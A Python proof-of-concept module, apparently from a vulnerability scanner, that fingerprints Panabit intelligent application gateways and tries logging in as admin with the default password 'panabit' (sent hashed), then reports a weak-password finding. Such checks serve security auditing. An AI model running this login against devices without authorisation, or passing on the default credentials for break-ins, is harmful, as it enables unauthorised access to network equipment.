# -*- coding:utf-8 -*-
# Panabit智能应用网关 弱密码

from .. import fileUtil
from ServiceScanModel.models import ServiceScan
from ..requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil= Requests(service.cookies)
        self.result = False

    def login(self, url):
        resp = self.requestUtil.post(url + "/login/userverify.cgi",
                                data="action=user_login&palang=ch&username=admin&password=722289d072731e2cc73038aa9ad9e067").json()
        print(resp["code"])
        if resp["code"] == 0:
            return True

    def fingerprint(self):
        try:
            if self.service.url:
                resp = self.requestUtil.get(self.service.url)
                if "pa_row" in resp.text:
                    return True
        except:
            return False

    def poc(self):
        try:
            if self.login(self.service.url):
                return ["Panabit智能应用网关 弱密码", "用户名: admin<br>密码: panabit"]
        except:
            return []
